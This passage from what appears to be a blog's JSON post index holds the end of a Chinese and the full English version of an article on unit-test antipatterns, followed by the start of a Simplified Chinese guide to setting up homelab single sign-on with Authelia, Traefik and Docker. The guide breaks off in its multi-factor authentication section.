&quot;test@example.com&quot; # 儲存使用者 db.save(user) # 檢索使用者 saved_user &#x3D; db.get_user(&quot;testuser&quot;) # 檢查使用者是否存在 assert saved_user is not None # 檢查使用者名稱是否匹配 assert saved_user.username &#x3D;&#x3D; &quot;testuser&quot; # 檢查電子郵件是否匹配 assert saved_user.email &#x3D;&#x3D; &quot;test@example.com&quot; 💬 問題所在只是重複程式碼所做的事情的註解是雜訊。它們不增加清晰度——它們增加混亂。如果你的測試需要這麼多註解才能理解，測試本身寫得很差。 應該怎麼做：編寫具有清楚變數名稱和結構的自我記錄程式碼。使用測試名稱來描述正在測試什麼。註解應該解釋為什麼，而不是什麼。 「什麼都不斷言」信心增強器 test(&#39;process payment&#39;, async () &#x3D;&gt; &#123; const payment &#x3D; &#123; amount: 100, currency: &#39;USD&#39; &#125;; await paymentService.process(payment); &#x2F;&#x2F; 測試通過！ &#125;); ✅ 問題所在這個測試總是通過，因為它沒有斷言任何東西。這是一種虛假的安全感。付款可能失敗、拋出內部捕獲的異常或返回錯誤——測試仍然是綠色的。 應該怎麼做：斷言預期結果。付款成功了嗎？資料庫更新了嗎？使用者收到確認了嗎？沒有斷言的測試不是測試。 「模擬所有東西」模擬器 @Test public void testUserService() &#123; UserRepository mockRepo &#x3D; mock(UserRepository.class); EmailService mockEmail &#x3D; mock(EmailService.class); Logger mockLogger &#x3D; mock(Logger.class); Config mockConfig &#x3D; mock(Config.class); TimeProvider mockTime &#x3D; mock(TimeProvider.class); when(mockRepo.findById(1)).thenReturn(new User(&quot;john&quot;)); when(mockConfig.get(&quot;feature.enabled&quot;)).thenReturn(&quot;true&quot;); when(mockTime.now()).thenReturn(Instant.parse(&quot;2025-01-01T00:00:00Z&quot;)); UserService service &#x3D; new UserService(mockRepo, mockEmail, mockLogger, mockConfig, mockTime); User user &#x3D; service.getUser(1); assertEquals(&quot;john&quot;, user.getName()); verify(mockLogger).info(&quot;User retrieved: john&quot;); &#125; 🎭 問題所在你正在測試模擬返回你告訴它們返回的東西。這個測試對實際業務邏輯沒有驗證任何東西。它與現實如此隔離，以至於在生產程式碼完全損壞時它可能通過。 應該怎麼做：模擬外部依賴（資料庫、API、檔案系統），但不要模擬所有東西。盡可能用真實物件測試真實邏輯。整合測試補充單元測試——兩者都使用。 「忽略失敗」策略 @pytest.mark.skip(reason&#x3D;&quot;Flaky test, will fix later&quot;) def test_concurrent_access(): # 測試實作 pass @unittest.skip(&quot;Fails on CI, works locally&quot;) def test_file_upload(): # 測試實作 pass 🚫 問題所在跳過的測試是永遠不會償還的技術債務。「稍後修復」變成「永遠不修復」。這些測試腐爛，隨著時間的推移變得更過時、更難修復。最終，沒有人記得為什麼它們被跳過或它們應該測試什麼。 應該怎麼做：修復測試或刪除它。如果它真的不穩定，使其確定性。如果它測試的東西不再重要，刪除它。跳過的測試比沒有測試更糟——它們給予虛假的信心。 教訓 使這些測試醜陋的不僅僅是糟糕的風格——而是它們在測試的基本目的上失敗了：提供程式碼正確工作的信心和它應該如何行為的文件。 好的測試有共同的特徵： 專注：一個測試，一個行為。當它失敗時，你確切知道什麼壞了。 可讀：測試名稱和結構清楚地傳達正在測試什麼以及為什麼。 確定性：相同的輸入，相同的輸出，每次都是。沒有不穩定性，沒有隨機性，沒有時間依賴性。 快速：測試應該在毫秒內運行，而不是秒。慢速測試不會被運行。 獨立：測試不依賴彼此或共享狀態。它們可以以任何順序運行。 可維護：當需求改變時，測試易於更新。重複最小化。 前進之路 如果你在這些例子中認出自己的程式碼，不要感到難過——我們都寫過醜陋的測試。重要的是學習和改進。 當你寫下一個測試時，問問自己： 如果這個測試在六個月後失敗，我會理解為什麼嗎？ 我是在測試我的程式碼還是框架？ 我能刪除一半的設定程式碼並仍然有一個有效的測試嗎？ 這個測試給我信心程式碼能工作嗎？ 單元測試是一項隨著實踐而提高的技能。我們今天寫的醜陋測試教會我們明天寫更好的測試。與你的團隊分享你的測試恐怖故事。嘲笑它們。從中學習。最重要的是，重構它們。 因為唯一比醜陋測試更糟的是根本沒有測試。 ✨ 一線希望每個醜陋的測試都是學習的機會。程式碼審查捕捉這些問題。重構改進它們。分享這些故事幫助整個社群寫更好的測試。我們都在一起。","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"}],"lang":"zh-TW"},{"title":"Ugly Unit Tests - A Collection of Testing Horrors","slug":"2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","permalink":"https://neo01.com/2025/01/Ugly-Unit-Tests-A-Collection-of-Testing-Horrors/","excerpt":"From test-everything monsters to sleep-and-pray approaches, explore real-world testing nightmares and learn how to write maintainable tests that actually give you confidence.","text":"We’ve all been there. You open a test file, expecting to understand what the code does, and instead you’re greeted with a monstrosity that makes you question everything. Unit tests are supposed to make our lives easier—they document behavior, catch regressions, and give us confidence to refactor. But sometimes, they become the very thing they were meant to prevent: unmaintainable nightmares. Let me share some of the ugliest unit tests I’ve encountered in the wild. Names have been changed to protect the guilty, but the horror is real. The “Test Everything in One” Monster @Test public void testUserService() &#123; &#x2F;&#x2F; Test user creation User user &#x3D; new User(&quot;john&quot;, &quot;password123&quot;); userService.save(user); assertNotNull(user.getId()); &#x2F;&#x2F; Test user login boolean loggedIn &#x3D; userService.login(&quot;john&quot;, &quot;password123&quot;); assertTrue(loggedIn); &#x2F;&#x2F; Test user update user.setEmail(&quot;john@example.com&quot;); userService.update(user); assertEquals(&quot;john@example.com&quot;, userService.findById(user.getId()).getEmail()); &#x2F;&#x2F; Test user deletion userService.delete(user.getId()); assertNull(userService.findById(user.getId())); &#x2F;&#x2F; Test password reset User user2 &#x3D; new User(&quot;jane&quot;, &quot;password456&quot;); userService.save(user2); userService.resetPassword(user2.getId(), &quot;newpassword&quot;); assertTrue(userService.login(&quot;jane&quot;, &quot;newpassword&quot;)); &#125; 🔥 The ProblemThis test violates the fundamental principle: one test, one concern. When this test fails, which of the five different behaviors broke? You'll need to debug through the entire method to find out. Tests become interdependent—if user creation fails, everything else fails too, hiding other potential bugs. What it should be: Five separate tests, each with a clear name describing what it verifies. When testUserDeletion fails, you know exactly where to look. The “Sleep and Pray” Approach def test_async_processing(): job_id &#x3D; queue.submit_job(data) time.sleep(5) # Wait for job to complete result &#x3D; queue.get_result(job_id) assert result.status &#x3D;&#x3D; &quot;completed&quot; ⏰ The ProblemTiming-based tests are flaky nightmares. On a fast machine, 5 seconds might be enough. On a slow CI server under load, it might not be. The test passes locally but fails randomly in production. Developers start ignoring test failures because &quot;it's just that flaky test again.&quot; What it should be: Use proper synchronization mechanisms—callbacks, promises, or polling with timeouts. Mock the async behavior if possible. Never rely on arbitrary sleep durations. The “Copy-Paste Paradise” test(&#39;user can add item to cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [], total: 0, tax: 0, shipping: 0 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; addToCart(user, cart, item); expect(cart.items.length).toBe(1); &#125;); test(&#39;user can remove item from cart&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;; removeFromCart(user, cart, item); expect(cart.items.length).toBe(0); &#125;); test(&#39;user can update item quantity&#39;, () &#x3D;&gt; &#123; const user &#x3D; &#123; id: 1, name: &#39;John&#39;, email: &#39;john@test.com&#39;, address: &#39;123 Main St&#39;, phone: &#39;555-1234&#39; &#125;; const cart &#x3D; &#123; id: 1, userId: 1, items: [&#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 1, category: &#39;tools&#39; &#125;], total: 29.99, tax: 2.50, shipping: 5.00 &#125;; const item &#x3D; &#123; id: 101, name: &#39;Widget&#39;, price: 29.99, quantity: 2, category: &#39;tools&#39; &#125;; updateCartItem(user, cart, item); expect(cart.items[0].quantity).toBe(2); &#125;); 📋 The ProblemMassive duplication makes maintenance a nightmare. Need to change the user object structure? Update it in 50 places. The setup code is longer than the actual test logic, burying the important parts in noise. What it should be: Extract test fixtures, use factory functions, or leverage test setup methods. The test should focus on what makes it unique, not repeat boilerplate. The “Magic Number Extravaganza” [Test] public void TestOrderCalculation() &#123; var order &#x3D; new Order(); order.AddItem(100, 2); order.AddItem(50, 3); order.ApplyDiscount(0.1); Assert.AreEqual(315, order.GetTotal()); &#125; ❓ The ProblemWhat do these numbers mean? Why is 315 the expected result? Is the discount 10% or 0.1%? When this test fails, you'll spend 10 minutes with a calculator figuring out the math before you can even start debugging. What it should be: Use named constants or variables that explain the calculation. const decimal ITEM_PRICE = 100m; const int QUANTITY = 2; const decimal DISCOUNT_PERCENT = 10m; Now the test documents itself. The “Test the Framework” Masterpiece @Test public void testListAdd() &#123; List&lt;String&gt; list &#x3D; new ArrayList&lt;&gt;(); list.add(&quot;test&quot;); assertEquals(1, list.size()); assertEquals(&quot;test&quot;, list.get(0)); &#125; @Test public void testMapPut() &#123; Map&lt;String, Integer&gt; map &#x3D; new HashMap&lt;&gt;(); map.put(&quot;key&quot;, 42); assertEquals(42, map.get(&quot;key&quot;)); &#125; 🤦 The ProblemThese tests verify that Java's standard library works correctly. Spoiler: it does. Oracle has already tested ArrayList and HashMap extensively. These tests add zero value while increasing maintenance burden and build time. What it should be: Test your code, not the framework. If you’re not adding any business logic, you don’t need a test. The “Comment-Driven Development” Approach def test_user_registration(): # Create a user user &#x3D; User() # Set the username user.username &#x3D; &quot;testuser&quot; # Set the password user.password &#x3D; &quot;password123&quot; # Set the email user.email &#x3D; &quot;test@example.com&quot; # Save the user db.save(user) # Retrieve the user saved_user &#x3D; db.get_user(&quot;testuser&quot;) # Check if the user exists assert saved_user is not None # Check if the username matches assert saved_user.username &#x3D;&#x3D; &quot;testuser&quot; # Check if the email matches assert saved_user.email &#x3D;&#x3D; &quot;test@example.com&quot; 💬 The ProblemComments that just repeat what the code does are noise. They don't add clarity—they add clutter. If your test needs this many comments to be understandable, the test itself is poorly written. What it should be: Write self-documenting code with clear variable names and structure. Use the test name to describe what’s being tested. Comments should explain why, not what. The “Assert Nothing” Confidence Booster test(&#39;process payment&#39;, async () &#x3D;&gt; &#123; const payment &#x3D; &#123; amount: 100, currency: &#39;USD&#39; &#125;; await paymentService.process(payment); &#x2F;&#x2F; Test passes! &#125;); ✅ The ProblemThis test always passes because it doesn't assert anything. It's a false sense of security. The payment could fail, throw an exception that's caught internally, or return an error—and the test would still be green. What it should be: Assert the expected outcome. Did the payment succeed? Was the database updated? Did the user receive a confirmation? A test without assertions is not a test. The “Mock Everything” Simulator @Test public void testUserService() &#123; UserRepository mockRepo &#x3D; mock(UserRepository.class); EmailService mockEmail &#x3D; mock(EmailService.class); Logger mockLogger &#x3D; mock(Logger.class); Config mockConfig &#x3D; mock(Config.class); TimeProvider mockTime &#x3D; mock(TimeProvider.class); when(mockRepo.findById(1)).thenReturn(new User(&quot;john&quot;)); when(mockConfig.get(&quot;feature.enabled&quot;)).thenReturn(&quot;true&quot;); when(mockTime.now()).thenReturn(Instant.parse(&quot;2025-01-01T00:00:00Z&quot;)); UserService service &#x3D; new UserService(mockRepo, mockEmail, mockLogger, mockConfig, mockTime); User user &#x3D; service.getUser(1); assertEquals(&quot;john&quot;, user.getName()); verify(mockLogger).info(&quot;User retrieved: john&quot;); &#125; 🎭 The ProblemYou're testing that mocks return what you told them to return. This test verifies nothing about the actual business logic. It's so isolated from reality that it could pass while the production code is completely broken. What it should be: Mock external dependencies (databases, APIs, file systems), but don’t mock everything. Test real logic with real objects when possible. Integration tests complement unit tests—use both. The “Ignore the Failure” Strategy @pytest.mark.skip(reason&#x3D;&quot;Flaky test, will fix later&quot;) def test_concurrent_access(): # Test implementation pass @unittest.skip(&quot;Fails on CI, works locally&quot;) def test_file_upload(): # Test implementation pass 🚫 The ProblemSkipped tests are technical debt that never gets paid. &quot;Will fix later&quot; becomes &quot;will never fix.&quot; These tests rot, becoming more outdated and harder to fix over time. Eventually, no one remembers why they were skipped or what they were supposed to test. What it should be: Fix the test or delete it. If it’s truly flaky, make it deterministic. If it’s testing something that no longer matters, remove it. Skipped tests are worse than no tests—they give false confidence. The Lessons What makes these tests ugly isn’t just poor style—it’s that they fail at the fundamental purpose of testing: providing confidence that code works correctly and documentation of how it should behave. Good tests share common characteristics: Focused: One test, one behavior. When it fails, you know exactly what broke. Readable: The test name and structure clearly communicate what’s being tested and why. Deterministic: Same input, same output, every time. No flakiness, no randomness, no timing dependencies. Fast: Tests should run in milliseconds, not seconds. Slow tests don’t get run. Independent: Tests don’t depend on each other or shared state. They can run in any order. Maintainable: When requirements change, tests are easy to update. Duplication is minimized. The Path Forward If you recognize your own code in these examples, don’t feel bad—we’ve all written ugly tests. The important thing is to learn and improve. When you write your next test, ask yourself: If this test fails six months from now, will I understand why? Am I testing my code or the framework? Could I delete half of this setup code and still have a valid test? Does this test give me confidence that the code works? Unit testing is a skill that improves with practice. The ugly tests we write today teach us to write better tests tomorrow. Share your testing horror stories with your team. Laugh about them. Learn from them. And most importantly, refactor them. Because the only thing worse than ugly tests is no tests at all. ✨ The Silver LiningEvery ugly test is an opportunity to learn. Code review catches these issues. Refactoring improves them. And sharing these stories helps the entire community write better tests. We're all in this together.","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"Best Practices","slug":"Best-Practices","permalink":"https://neo01.com/tags/Best-Practices/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"}]},{"title":"在家中建立单点登录系统","slug":"2025/01/Single-Sign-On-at-Home-zh-CN","date":"un33fin33","updated":"un00fin00","comments":false,"path":"/zh-CN/2025/01/Single-Sign-On-at-Home/","permalink":"https://neo01.com/zh-CN/2025/01/Single-Sign-On-at-Home/","excerpt":"厌倦了管理家庭实验室服务的数十个密码？学习如何建立单点登录系统，只需一次登录即可访问所有服务。","text":"你已经建立了一个令人印象深刻的家庭实验室——Nextcloud、Jellyfin、Home Assistant、Portainer、Grafana，以及十几个其他服务。每个都很棒。每个也都有自己的登录页面。以及自己的密码。以及自己的会话超时。 听起来很熟悉吗？欢迎来到密码疲劳的世界。 如果你可以登录一次就访问所有内容呢？这就是单点登录（SSO），它不再只是企业专用。 为什么在家中需要 SSO？ 问题所在： 15+ 个服务 = 15+ 个要记住的密码（或重复使用 😱） 分别登录每个服务浪费时间 没有集中式用户管理 需要时难以撤销访问权限 密码重置是一场噩梦 解决方案： SSO 提供： 一次登录适用于所有服务 集中式身份验证 - 在一个地方管理用户 更好的安全性 - 一次强制执行 MFA，适用于所有地方 更容易的入职 - 一次将家人/朋友加入所有服务 快速撤销 - 停用一个账户，锁定所有地方 理解 SSO 基础 什么是单点登录？ SSO 是一种身份验证方案，允许用户登录一次并访问多个应用程序，无需重新验证。 简单示例： 没有 SSO：登录 Nextcloud → 登录 Grafana → 登录 Jellyfin（3 次登录） 有 SSO：登录一次 → 访问所有三个服务（1 次登录） 关键组件说明 将 SSO 想象成一个有多个 VIP 房间的夜店。让我们分解每个组件： 1. 身份提供者（IdP）- 保安 **它的作用：**验证你是谁的中央身份验证机构。 **现实世界类比：**就像夜店入口的保安，检查你的身份证并给你一个手环。 在你的家庭实验室中： Authelia、Authentik 或 Keycloak 充当保安 当你尝试访问任何服务时，你会先被重定向到这里 它检查你的用户名/密码和 MFA 一旦验证，它会给你一个「令牌」（就像手环） 示例流程： 你 → 尝试访问 Nextcloud Nextcloud → &quot;我不认识你，去问保安&quot; 你 → 重定向到 Authelia 登录页面 Authelia → &quot;出示你的凭证&quot; 你 → 输入密码 + MFA 代码 Authelia → &quot;已验证！这是你的令牌&quot; 2. 服务提供者（SP）- VIP 房间 **它的作用：**信任 IdP 验证用户的实际应用程序。 **现实世界类比：**就像夜店中的 VIP 房间。他们不检查你的身份证——他们只看保安给的手环。 在你的家庭实验室中： **你的应用程序：**Nextcloud、Grafana、Jellyfin、Home Assistant 它们不自己处理密码 它们信任 IdP 的决定 它们只检查：“你有来自 Authelia 的有效令牌吗？” 示例： 你 → 访问 Grafana（带有来自 Authelia 的令牌） Grafana → &quot;我看到你有来自 Authelia 的有效令牌&quot; Grafana → &quot;Authelia 说你是 &#39;alice&#39;，在 &#39;admins&#39; 组中&quot; Grafana → &quot;欢迎！&quot; 3. 用户目录 - 宾客名单 **它的作用：**存储用户信息（用户名、密码、组）。 **现实世界类比：**保安检查的宾客名单。 在你的家庭实验室中： **简单：**包含用户名和哈希密码的 YAML 文件 **高级：**LDAP 服务器（就像用户的数据库） 包含：用户名、密码、电子邮件、组成员资格 示例结构： users: alice: password: (哈希) email: alice@home.local groups: [admins, users] bob: password: (哈希) email: bob@home.local groups: [users] 4. 身份验证 vs 授权 **身份验证：**证明你是谁（“你是 Alice 吗？”） **授权：**决定你可以做什么（“Alice 可以访问管理面板吗？”） 现实世界类比： 身份验证 = 出示身份证证明你已满 21 岁 授权 = 保安决定你是否可以进入 VIP 区 在 SSO 中： IdP 处理身份验证：“是的，这是 Alice，密码正确” 应用程序处理授权：“Alice 在 ‘admins’ 组中，授予管理员访问权限” 5. 身份验证协议 - 语言 **它们的作用：**IdP 和应用程序通信的标准化方式。 **现实世界类比：**就像保安和 VIP 房间用来沟通的不同语言。 OIDC（OpenID Connect）- 现代且推荐： 身份验证：“你是谁？” 授权：“你在哪些组中？” 使用 JSON（易于阅读） 建立在 OAuth2 之上 大多数现代应用程序支持 尽可能使用此协议 OIDC 令牌示例： &#123; &quot;sub&quot;: &quot;alice&quot;, &quot;email&quot;: &quot;alice@homelab.local&quot;, &quot;groups&quot;: [&quot;admins&quot;, &quot;users&quot;], &quot;exp&quot;: 1705334400 &#125; SAML - 企业标准： 就像说正式的法律语言 使用 XML（冗长） 较旧的企业应用程序使用它 更复杂但广泛支持 在企业环境中常见 Windows 集成身份验证（WIA）- 仅限 Windows： 使用 Kerberos/NTLM Windows 域用户自动登录 在域上无需密码提示 **仅适用于：**Active Directory + Windows 客户端 非联合 - 无法与外部 SaaS 应用程序集成 不适合家庭实验室，除非你运行 Windows Server 域 6. 联合 vs 非联合身份验证 什么是联合？ 联合允许不同组织/系统相互信任彼此的身份验证。 现实世界类比： **非联合：**你的健身房会员资格只在你的健身房有效 **联合：**你的护照在多个国家有效（它们相互信任） 非联合身份验证（WIA、基本验证）： 你的家庭实验室 IdP → 仅适用于你的家庭实验室服务 ❌ 无法向外部 SaaS（GitHub、AWS 等）进行身份验证 联合身份验证（OIDC、SAML）： 你的家庭实验室 IdP ↔ 外部 SaaS（如果它们支持） ✅ 可以向信任你的 IdP 的服务进行身份验证 示例场景： 非联合（WIA）： 你 → Windows 域控制器 → 家庭实验室应用程序 ✅ 你 → Windows 域控制器 → GitHub ❌（GitHub 不信任你的 DC） 联合（OIDC/SAML）： 你 → Authentik → 家庭实验室应用程序 ✅ 你 → Authentik → GitHub Enterprise ✅（如果已配置） 你 → Authentik → AWS ✅（如果已配置） 家庭实验室的陷阱： 大多数 SaaS 提供者仅支持企业订阅的联合： 服务 免费/个人 企业 GitHub 无 SSO 使用 SAML 的 SSO AWS 无 SSO 使用 SAML 的 SSO Google Workspace 无 SSO 使用 SAML 的 SSO Microsoft 365 无 SSO 使用 SAML 的 SSO Slack 无 SSO 使用 SAML 的 SSO 成本现实： GitHub Enterprise：$21/用户/月 AWS SSO：需要 AWS Organizations Google Workspace：$12-18/用户/月（SSO） Microsoft 365：$22/用户/月（SSO） ⚠️ 家庭实验室 SSO 限制你的家庭实验室 SSO 将适用于： ✅ 自托管服务（Nextcloud、Grafana、Jellyfin） ✅ 你控制的服务 ✅ 支持 OIDC/SAML 且无限制的应用程序 你的家庭实验室 SSO 将不适用于： ❌ 免费层 SaaS（GitHub、Gmail、Slack） ❌ 需要企业订阅的服务 ❌ 不支持自定义 IdP 的服务 这将家庭实验室 SSO 限制为仅内部服务，但对于管理 10-20 个自托管应用程序仍然很有价值！ 比较： 协议 最适合 复杂度 联合 家庭实验室友好 OIDC 现代应用程序 低 ✅ 是 ✅ 是 SAML 企业应用程序 高 ✅ 是 ⚠️ 如果需要 WIA Windows 域 中 ❌ 否 ❌ 过度 💡 协议选择对于家庭实验室： 使用 OIDC 适用于支持它的应用程序（Grafana、Nextcloud、Portainer） 使用转发验证（Authelia）适用于不支持 OIDC 的应用程序 跳过 WIA，除非你已经运行 Active Directory（而且它无法与 SaaS 一起使用） 仅在特定应用程序需要时使用 SAML **接受限制：**你的 SSO 无法与免费层 SaaS（GitHub、Gmail 等）一起使用 🎯 关键要点 IdP（Authelia） = 你登录的唯一地方 服务提供者（你的应用程序） = 信任 IdP 的决定 用户目录 = 存储用户名/密码的地方 协议（OIDC/SAML） = 它们如何相互通信 你在 IdP 登录一次，你的所有应用程序都信任该登录。 资源 **Authelia 文档：**完整的 Authelia 指南 **Authentik 文档：**Authentik 设置和配置 **Keycloak 文档：**企业 SSO 指南 **OIDC 说明：**理解 OpenID Connect 结论 在家中设置 SSO 将你的家庭实验室从一系列独立服务转变为统一平台。初始设置投资立即通过便利性和改进的安全性得到回报。 关键要点： SSO 消除了多个服务的密码疲劳 Authelia 最适合简单设置，配合反向代理 Authentik 提供完整功能，配有美观的 UI 转发验证保护任何服务 MFA 添加关键安全层 LDAP 集成可扩展用于更大的部署 定期备份至关重要（SSO 是单点故障） 家庭实验室 SSO 限于自托管服务 - SaaS 集成需要昂贵的企业计划 联合（OIDC/SAML）实现跨系统 SSO，但 WIA 是非联合的 快速入门建议： 对于大多数家庭实验室： 从 Authelia + Traefik 开始（最简单的路径） 最初使用基于文件的身份验证 为管理员账户添加 MFA 逐步将服务迁移到 SSO 如果以后需要 OIDC/SAML，考虑 Authentik 从 2-3 个服务开始，熟悉流程，然后扩展。当你不再需要处理数十个密码时，未来的你会感谢你！🔐 设置 Authelia 架构 flowchart TD User[\"👤 用户\"] Proxy[\"🚪 反向代理 (Traefik/nginx)\"] Authelia[\"🔐 Authelia\"] LDAP[\"📚 用户目录 (YAML/LDAP)\"] subgraph Services[\" \"] App1[\"📦 Nextcloud\"] App2[\"🎬 Jellyfin\"] App3[\"📊 Grafana\"] end User --> Proxy Proxy --> Authelia Proxy --> Services Authelia -.-> LDAP style Authelia fill:#e3f2fd style Proxy fill:#fff3e0 style LDAP fill:#f3e5f5 style Services fill:#e8f5e9 先决条件 Docker 和 Docker Compose 反向代理（Traefik 或 nginx） 域名（或本地 DNS） 步骤 1：创建目录结构 mkdir -p authelia&#x2F;&#123;config,secrets&#125; cd authelia 步骤 2：生成密钥 # JWT 密钥 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;jwt_secret # 会话密钥 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;session_secret # 存储加密密钥 tr -cd &#39;[:alnum:]&#39; &lt; &#x2F;dev&#x2F;urandom | fold -w &quot;64&quot; | head -n 1 &gt; secrets&#x2F;storage_encryption_key 步骤 3：创建配置 # config&#x2F;configuration.yml --- theme: dark default_2fa_method: &quot;totp&quot; server: host: 0.0.0.0 port: 9091 log: level: info totp: issuer: homelab.local period: 30 skew: 1 authentication_backend: file: path: &#x2F;config&#x2F;users_database.yml password: algorithm: argon2id iterations: 1 salt_length: 16 parallelism: 8 memory: 64 access_control: default_policy: deny rules: - domain: &quot;*.homelab.local&quot; policy: two_factor session: name: authelia_session domain: homelab.local expiration: 1h inactivity: 5m remember_me_duration: 1M regulation: max_retries: 3 find_time: 2m ban_time: 5m storage: encryption_key_secret_file: &#x2F;secrets&#x2F;storage_encryption_key local: path: &#x2F;config&#x2F;db.sqlite3 notifier: filesystem: filename: &#x2F;config&#x2F;notification.txt 步骤 4：创建用户 # config&#x2F;users_database.yml users: alice: displayname: &quot;Alice Smith&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: alice@homelab.local groups: - admins - users bob: displayname: &quot;Bob Jones&quot; password: &quot;$argon2id$v&#x3D;19$m&#x3D;65536,t&#x3D;3,p&#x3D;4$...&quot; email: bob@homelab.local groups: - users 生成密码哈希： docker run --rm authelia&#x2F;authelia:latest authelia crypto hash generate argon2 --password &#39;yourpassword&#39; 步骤 5：Docker Compose # docker-compose.yml version: &#39;3.8&#39; services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;config:&#x2F;config - .&#x2F;secrets:&#x2F;secrets ports: - 9091:9091 environment: - TZ&#x3D;America&#x2F;New_York restart: unless-stopped 步骤 6：与 Traefik 集成 # docker-compose.yml（添加到现有的 Traefik 设置） services: authelia: image: authelia&#x2F;authelia:latest container_name: authelia volumes: - .&#x2F;authelia&#x2F;config:&#x2F;config - .&#x2F;authelia&#x2F;secrets:&#x2F;secrets labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.authelia.rule&#x3D;Host(&#96;auth.homelab.local&#96;)&quot; - &quot;traefik.http.routers.authelia.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.authelia.tls&#x3D;true&quot; - &quot;traefik.http.services.authelia.loadbalancer.server.port&#x3D;9091&quot; # Authelia 中间件 - &quot;traefik.http.middlewares.authelia.forwardauth.address&#x3D;http:&#x2F;&#x2F;authelia:9091&#x2F;api&#x2F;verify?rd&#x3D;https:&#x2F;&#x2F;auth.homelab.local&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.trustForwardHeader&#x3D;true&quot; - &quot;traefik.http.middlewares.authelia.forwardauth.authResponseHeaders&#x3D;Remote-User,Remote-Groups,Remote-Name,Remote-Email&quot; restart: unless-stopped # 受保护服务示例 nextcloud: image: nextcloud:latest labels: - &quot;traefik.enable&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.rule&#x3D;Host(&#96;nextcloud.homelab.local&#96;)&quot; - &quot;traefik.http.routers.nextcloud.entrypoints&#x3D;websecure&quot; - &quot;traefik.http.routers.nextcloud.tls&#x3D;true&quot; - &quot;traefik.http.routers.nextcloud.middlewares&#x3D;authelia@docker&quot; restart: unless-stopped 步骤 7：启动服务 docker-compose up -d 访问 https://auth.homelab.local 查看登录页面。 理解身份验证流程 现在你已经设置好 Authelia，让我们看看当你访问受保护的服务时到底发生了什么： sequenceDiagram participant User participant App as 应用程序 (Nextcloud) participant SSO as SSO 提供者 (Authelia) participant LDAP as 用户目录 (YAML/LDAP) User->>App: 1. 访问应用程序 App->>User: 2. 重定向到 SSO 登录 User->>SSO: 3. 输入凭证 + MFA SSO->>LDAP: 4. 验证凭证 LDAP->>SSO: 5. 用户已验证 SSO->>App: 6. 返回验证令牌 App->>User: 7. 授予访问权限 Note over User,App: 用户现在已登录！ User->>App: 8. 访问另一个应用程序 (Jellyfin) App->>SSO: 9. 检查现有会话 SSO->>App: 10. 有效会话存在 App->>User: 11. 授予访问权限（无需登录） 幕后发生的事情： **首次访问：**你访问 nextcloud.homelab.local **Traefik 拦截：**向 Authelia 检查 - “这个用户已验证吗？” **未验证：**Authelia 将你重定向到 auth.homelab.local **你登录：**输入用户名、密码和 MFA 代码 **Authelia 验证：**对照用户数据库检查凭证 **创建会话：**Authelia 创建会话 cookie **重定向回来：**你被送回 Nextcloud **授予访问权限：**Traefik 看到有效会话，允许访问 第二个服务访问： 你访问 grafana.homelab.local Traefik 向 Authelia 检查 - “这个用户已验证吗？” Authelia 看到现有会话 cookie - “是的，是 Alice！” 立即授予访问权限 - 无需登录 这就是 SSO 的魔法 - 一次登录，到处访问！ 添加多因素验证 MFA 选项概览 方法 安全性 便利性 成本 防钓鱼 Passkey (WebAuthn) 最高 高 免费 ✅ 是 硬件密钥 最高 中 $25-50 ✅ 是 TOTP（验证器应用程序） 高 中 免费 ❌ 否 SMS 低 高 需要 SMS 网关 ❌ 否 1. Passkey（WebAuthn）- 推荐 什么是 Passkey？ Passkey 是使用生物识别验证（指纹、面部、PIN）的密码现代替代品。 **现实世界类比：**就像使用指纹解锁手机，而不是输入密码。 工作方式： 你的设备存储加密密钥 你使用生物识别（指纹/面部）或设备 PIN 进行验证 没有密码可以被窃取或钓鱼 通过云同步跨设备工作（iCloud 钥匙串、Google 密码管理器） Authentik 设置： 用户菜单 → 设置 MFA 设备 → 注册 选择 WebAuthn 或 Passkey 按照浏览器提示： **移动设备：**使用指纹/Face ID **笔记本电脑：**使用 Touch ID/Windows Hello **台式机：**使用手机作为 passkey 或硬件密钥 Authelia 设置： 登录任何受保护的服务 点击「注册安全密钥」 选择 passkey 选项 使用生物识别进行验证 支持的平台： ✅ iPhone/iPad（iOS 16+）- Face ID/Touch ID ✅ Android（9+）- 指纹/面部解锁 ✅ macOS（Ventura+）- Touch ID ✅ Windows（10+）- Windows Hello ✅ Chrome/Edge/Safari - 内置支持 2. 